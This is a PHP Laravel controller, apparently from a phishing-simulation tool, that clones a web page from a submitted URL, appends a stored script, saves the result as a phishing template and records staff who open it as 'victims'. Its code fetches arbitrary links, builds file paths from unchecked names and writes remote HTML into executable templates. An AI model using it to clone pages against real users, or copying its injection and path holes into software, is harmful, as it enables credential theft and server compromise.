<?php

namespace App\Http\Controllers;

use App\Models\Campaign;
use App\Models\Template;
use App\Models\Victim;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;

class TemplateController extends Controller
{
    public function saveTemplate($args)
    {
        Template::create([

            'name' => $args['name'],
            'link' => strtok($args['link'], "?")

        ]);
    }


    public function sendReq(Request $request)
    {
        if ($request->method() == "GET") {
            $temp = Template::get();

            return view('add_templates', compact('temp'));
        } else {

            $request->validate([
                'name' => 'required|unique:templates,name',
                'link' => 'required|url'
            ]);


            $link = $request['link'];
            $name = $request['name'];

            try {


                $response = Http::get($link);

                $file_path = resource_path('js/index.txt');

                $html = file_get_contents($file_path);

                $final_result = $response . '' . $html;

                $file = resource_path("views/phish_template/{$name}.blade.php");

                file_put_contents($file, $final_result);

                $this->saveTemplate(['name' => $name, 'link' => $link]);



                return redirect()->back()->with('success', 'Record inserted');
            } catch (\Throwable $th) {

                return redirect()->back()->withErrors("Some Error Occured While Importing Template");
            }
        }
    }


    public function showTemp(Request $request, $pages = null)
    {

        try {

            $id = $request['id'];
            $template = $request['template'];
            $email_temp = $request['email_temp'];

            $true = Campaign::where('id', $id)->exists();
            if ($true == true) {
                Victim::create([
                    'staff_id' => $id,
                    'template' => $template,
                    'email_temp' => $email_temp
                ]);
            }
            if ($pages) {

                return view('phish_template.' . $pages, ['id' => $id]);
            }
        } catch (\Throwable $th) {
        }

        abort(404);
    }
}
